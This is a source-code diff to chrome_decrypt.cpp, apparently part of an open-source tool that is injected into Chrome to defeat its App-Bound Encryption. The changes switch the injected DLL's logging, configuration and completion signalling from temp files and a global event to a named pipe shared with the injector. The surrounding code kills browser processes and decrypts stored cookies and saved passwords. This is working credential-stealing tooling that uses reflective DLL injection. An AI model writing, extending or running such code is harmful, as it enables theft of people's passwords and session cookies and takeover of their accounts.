@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.10.0 (c) Alexander 'xaitax' Hagenah
+// v0.11.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 /*
  * Chrome App-Bound Encryption Service:
@@ -24,9 +24,11 @@
 #include <memory>
 #include <cctype>
 #include "reflective_loader.h"
+#include <string>
 
-const WCHAR *COMPLETION_EVENT_NAME_DLL = L"Global\\ChromeDecryptWorkDoneEvent";
-const char *SESSION_CONFIG_FILE_NAME = "chrome_decrypt_session.cfg";
+HANDLE g_hChromeDecryptPipe = INVALID_HANDLE_VALUE;
+const std::string G_DLL_PIPE_COMPLETION_SIGNAL = "__DLL_PIPE_COMPLETION_SIGNAL__";
+static bool g_injectorIsVerbose = false;
 
 #include "sqlite3.h"
 
@@ -75,33 +77,19 @@ using SqliteStmtPtr = std::unique_ptr<sqlite3_stmt, SqliteStmtFinalizer>;
 
 namespace Logging
 {
-    fs::path GetLogFilePath()
-    {
-        try
-        {
-            return fs::temp_directory_path() / "chrome_decrypt.log";
-        }
-        catch (const fs::filesystem_error &e)
-        {
-            OutputDebugStringA(("chrome_decrypt: Filesystem error getting temp path for log: " + std::string(e.what()) + "\n").c_str());
-            return fs::path("chrome_decrypt.log");
-        }
-    }
-
     void Log(const std::string &message, bool overwrite = false)
     {
-        fs::path logFile = GetLogFilePath();
-        try
+        if (g_hChromeDecryptPipe != INVALID_HANDLE_VALUE)
         {
-            std::ofstream file(logFile, overwrite ? std::ios::trunc : (std::ios::app | std::ios::ate));
-            if (file)
+            DWORD bytesWrittenToPipe = 0;
+            if (!WriteFile(g_hChromeDecryptPipe, message.c_str(), message.length() + 1, &bytesWrittenToPipe, nullptr))
             {
-                file << message << std::endl;
+                OutputDebugStringA(("chrome_decrypt: Logging::Log: WriteFile to pipe failed. Error: " + std::to_string(GetLastError()) + "\n").c_str());
             }
         }
-        catch (const std::exception &e)
+        else
         {
-            OutputDebugStringA(("chrome_decrypt: Error writing to log file '" + logFile.string() + "': " + std::string(e.what()) + "\n").c_str());
+            OutputDebugStringA(("chrome_decrypt: Log (pipe_unavailable): " + message + "\n").c_str());
         }
     }
 }
@@ -422,17 +410,18 @@ namespace ChromeAppBound
                     {
                         if (TerminateProcess(hProcess, 0))
                         {
-                            Logging::Log("[+] Terminated process: ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ")");
+                            if (g_injectorIsVerbose)
+                            {
+                                Logging::Log("[+] Terminated process: ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ")");
+                            }
                         }
                         else
                         {
-                            // Logging::Log("[-] Failed to terminate process ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + "). Error: " + std::to_string(GetLastError()));
                         }
                         CloseHandle(hProcess);
                     }
                     else
                     {
-                        // Logging::Log("[-] Failed to open process ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ") for termination. Error: " + std::to_string(GetLastError()));
                     }
                 }
             } while (Process32NextW(snap, &pe));
@@ -668,7 +657,6 @@ namespace ChromeAppBound
                 }
                 else
                 {
-                    // Logging::Log("[-] Cookie decryption failed for " + std::string(host ? host : "<null_host>") + "/" + std::string(name ? name : "<null_name>"));
                 }
             }
         }
@@ -753,7 +741,6 @@ namespace ChromeAppBound
                 }
                 else
                 {
-                    // Logging::Log("[-] Password decryption failed for " + std::string(origin ? origin : "<null_origin>"));
                 }
             }
         }
@@ -914,44 +901,103 @@ namespace ChromeAppBound
 struct ThreadParams
 {
     HMODULE hModule_dll;
+    LPVOID lpPipeNamePointerFromInjector;
 };
 
 DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
 {
     ThreadParams *params = static_cast<ThreadParams *>(lpParam);
-    HMODULE hModule_dll_copy = params ? params->hModule_dll : NULL;
+    HMODULE hModule_dll_copy = nullptr;
+    LPWSTR pwszRemotePipeName = nullptr;
 
     if (params)
     {
+        hModule_dll_copy = params->hModule_dll;
+        pwszRemotePipeName = (LPWSTR)params->lpPipeNamePointerFromInjector;
         delete params;
         params = nullptr;
     }
+    else
+    {
+        OutputDebugStringA("chrome_decrypt: Worker: ThreadParams is null.\n");
+        ExitThread(1);
+    }
+
+    if (!pwszRemotePipeName)
+    {
+        OutputDebugStringA("chrome_decrypt: Worker: Pipe name pointer is null.\n");
+        if (hModule_dll_copy)
+            FreeLibraryAndExitThread(hModule_dll_copy, 1);
+        return 1;
+    }
+    std::wstring ipcPipeName(pwszRemotePipeName);
+
+    g_hChromeDecryptPipe = CreateFileW(
+        ipcPipeName.c_str(),
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr);
+
+    if (g_hChromeDecryptPipe == INVALID_HANDLE_VALUE)
+    {
+        OutputDebugStringA(("chrome_decrypt: Worker: CreateFileW for pipe client failed. Error: " + std::to_string(GetLastError()) + "\n").c_str());
+        if (hModule_dll_copy)
+            FreeLibraryAndExitThread(hModule_dll_copy, 1);
+        return 1;
+    }
+
+    DWORD dwMode = PIPE_READMODE_MESSAGE;
+    if (!SetNamedPipeHandleState(g_hChromeDecryptPipe, &dwMode, nullptr, nullptr))
+    {
+        OutputDebugStringA(("chrome_decrypt: Worker: SetNamedPipeHandleState failed. Error: " + std::to_string(GetLastError()) + "\n").c_str());
+        CloseHandle(g_hChromeDecryptPipe);
+        g_hChromeDecryptPipe = INVALID_HANDLE_VALUE;
+        if (hModule_dll_copy)
+            FreeLibraryAndExitThread(hModule_dll_copy, 1);
+        return 1;
+    }
 
     fs::path finalOutputPath;
-    try
+    char pipeReadBuffer[MAX_PATH + 1];
+    DWORD bytesReadFromPipe = 0;
+
+    if (ReadFile(g_hChromeDecryptPipe, pipeReadBuffer, sizeof(pipeReadBuffer) - 1, &bytesReadFromPipe, nullptr) && bytesReadFromPipe > 0)
     {
-        fs::path configFilePathDll = fs::temp_directory_path() / SESSION_CONFIG_FILE_NAME;
-        std::ifstream configFileDll(configFilePathDll);
-        if (configFileDll)
+        pipeReadBuffer[bytesReadFromPipe] = '\0';
+        std::string verboseStatusStr(pipeReadBuffer);
+        if (verboseStatusStr == "VERBOSE_TRUE")
         {
-            std::string outputPathStr((std::istreambuf_iterator<char>(configFileDll)), std::istreambuf_iterator<char>());
-            finalOutputPath = outputPathStr;
-            configFileDll.close();
-            std::error_code ec_remove_cfg;
-            fs::remove(configFilePathDll, ec_remove_cfg);
-            // Logging::Log("[+] Loaded output path from session config: " + finalOutputPath.u8string());
-        }
-        else
-        {
-            Logging::Log("[-] Session config file not found or unreadable: " + configFilePathDll.u8string() + ". Using default output path.");
-            finalOutputPath = fs::current_path() / "output_dll_default";
+            g_injectorIsVerbose = true;
         }
     }
-    catch (const std::exception &e)
+    else
     {
-        Logging::Log("[-] Exception reading session config: " + std::string(e.what()) + ". Using default output path.");
-        finalOutputPath = fs::current_path() / "output_dll_default_exc";
+        OutputDebugStringA(("chrome_decrypt: Worker: ReadFile for verbose status from pipe failed. Error: " + std::to_string(GetLastError()) + "\n").c_str());
+        CloseHandle(g_hChromeDecryptPipe);
+        g_hChromeDecryptPipe = INVALID_HANDLE_VALUE;
+        if (hModule_dll_copy)
+            FreeLibraryAndExitThread(hModule_dll_copy, 1);
+        return 1;
     }
+
+    if (ReadFile(g_hChromeDecryptPipe, pipeReadBuffer, sizeof(pipeReadBuffer) - 1, &bytesReadFromPipe, nullptr) && bytesReadFromPipe > 0)
+    {
+        pipeReadBuffer[bytesReadFromPipe] = '\0';
+        finalOutputPath = pipeReadBuffer;
+    }
+    else
+    {
+        OutputDebugStringA(("chrome_decrypt: Worker: ReadFile for output path from pipe failed. Error: " + std::to_string(GetLastError()) + "\n").c_str());
+        CloseHandle(g_hChromeDecryptPipe);
+        g_hChromeDecryptPipe = INVALID_HANDLE_VALUE;
+        if (hModule_dll_copy)
+            FreeLibraryAndExitThread(hModule_dll_copy, 1);
+        return 1;
+    }
+
     std::error_code ec_base_output;
     if (!fs::exists(finalOutputPath))
     {
@@ -1274,20 +1320,21 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
 
     Logging::Log("[*] Chrome data decryption process finished for " + cfg.name + ".");
 
-    HANDLE hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, COMPLETION_EVENT_NAME_DLL);
-    if (hEvent != NULL)
+    if (g_hChromeDecryptPipe != INVALID_HANDLE_VALUE)
     {
-        SetEvent(hEvent);
-        CloseHandle(hEvent);
+        Logging::Log(G_DLL_PIPE_COMPLETION_SIGNAL);
+        FlushFileBuffers(g_hChromeDecryptPipe);
     }
-    else
+
+    if (g_hChromeDecryptPipe != INVALID_HANDLE_VALUE)
     {
-        Logging::Log("[-] Could not open completion event to signal. Error: " + std::to_string(GetLastError()));
+        CloseHandle(g_hChromeDecryptPipe);
+        g_hChromeDecryptPipe = INVALID_HANDLE_VALUE;
     }
 
     if (hModule_dll_copy)
     {
-        Logging::Log("[*] Unloading DLL and exiting worker thread.");
+        OutputDebugStringA("chrome_decrypt: Worker: Unloading DLL and exiting worker thread.\n");
         FreeLibraryAndExitThread(hModule_dll_copy, 0);
     }
     return 0;
@@ -1305,6 +1352,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
             return TRUE;
         }
         params->hModule_dll = hModule;
+        params->lpPipeNamePointerFromInjector = lpReserved;
 
         HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, params, 0, NULL);
         if (hThread == NULL)
